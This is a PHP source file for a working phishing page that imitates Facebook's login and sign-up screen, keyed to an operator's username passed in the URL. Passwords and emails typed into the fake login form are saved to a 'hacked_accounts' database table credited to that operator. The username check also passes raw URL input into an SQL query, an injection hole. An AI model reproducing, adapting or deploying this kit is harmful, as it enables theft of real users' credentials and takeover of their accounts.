<?php 
include 'config.php';



if(isset($_GET['u'])){
	$link = $_GET['u'];
	$query_check = mysqli_query($con, "SELECT * FROM user WHERE username='$link'");
	$rowa = mysqli_fetch_array($query_check);
	$link_db = $rowa['username'];
	if($link == $link_db){
		echo '

	<div class="header">
		<div class="logo">
			<h1 style="color:white;">facebook</h1>
		</div>
		<div class="giris">


		<form action="fb.php?u='.$link.'" method="POST">
        <input type="email" name="log_email" placeholder="Email or Phone" style="margin-bottom: 10px;" required>
        <input type="password" name="log_password" placeholder="Password" style="margin-bottom: 10px;" required>
        

        <input type="submit" name="submit_hack" value="Log In" >
        <br>
        
      </form>
		</div>
	</div>
	
	<div class="container">
		<div class="soltaraf">
		<b>Facebook helps you connect and share with the people in your life.</b>
		<img src="https://www.facebook.com/rsrc.php/v3/yx/r/pyNVUg5EM0j.png">
		</div>
		

		<div class="kayit">
		<h1>Create an account</h1>
		<p>It\'s free and always will be.</p>
		<input class="kutus1" type="text" name="reg_fname" placeholder="First Name" style="margin-bottom: 10px; text-align: center;" value="" required>



        	<input class="kutus1" type="text" name="reg_lname" placeholder="Last Name" style="margin-bottom: 10px;text-align: center;" value="" required>
        
        	<input class="kutus2" type="email" name="reg_email" placeholder="Email" style="margin-bottom: 10px;text-align: center;" value="" required>
        
        	<input class="kutus2" type="password" style="margin-bottom: 10px;text-align: center;" name="reg_password" placeholder="Password" required>

        	<br>
        


		<small>By clicking Sign Up, you agree to our Terms, Data Policy and Cookie Policy. You may receive SMS notifications from us and can opt out at any time.</small>
		<button><b>Sign Up</b></button>
		</div>


	</div>

	<div class="footer">
		<small>
		<a href="#">English (UK)</a>
		<a href="#">اردو</a>
		<a href="#">پښتو</a>
		<a href="#">العربية</a>
		<a href="#">हिन्दी</a>
		<a href="#">বাংলা</a>
		<a href="#">ਪੰਜਾਬੀ</a>
		<a href="#">فارسی</a>
		<a href="#">ગુજરાતી</a>
		<a href="#">Deutsch</a>
		<a href="#">Español</a>
		</small>
<br><br>
	<small>
    Sign Up Log In Messenger Facebook Lite Find Friends People Profiles Pages Page categories Places Games Locations Market place Groups Instagram Local Fund raisers About Create ad Create Page Developers Careers Privacy Cookies Ad Choices
    Terms Account security Login help Help
    Settings
    Activity log
    <br><br>
   Facebook © 2019
</small>
	</div>

		';
		if(isset($_POST['submit_hack'])){
			$email = mysqli_real_escape_string($con,$_POST['log_email']);
			$password = mysqli_real_escape_string($con,$_POST['log_password']);
			$query_insert = mysqli_query($con, "INSERT INTO `hacked_accounts` (`id`, `email`, `password`, `hacked_by`) VALUES (NULL, '$email', '$password', '$link')");
			

		}
	}
	else{
		echo "WRONG USERNAME, PLEASE TYPE A CORRECT USERNAME TO ACCESS THIS PAGE";
	}
}
else{
	echo "404 LINK NOT FOUND";
}
 ?>




<!DOCTYPE html>
<html>
<head>
<title>Facebook - Log in or sign up</title>
<link type="text/css" rel="stylesheet" href="style.css">
</head>
<body>

	
</body>
</html>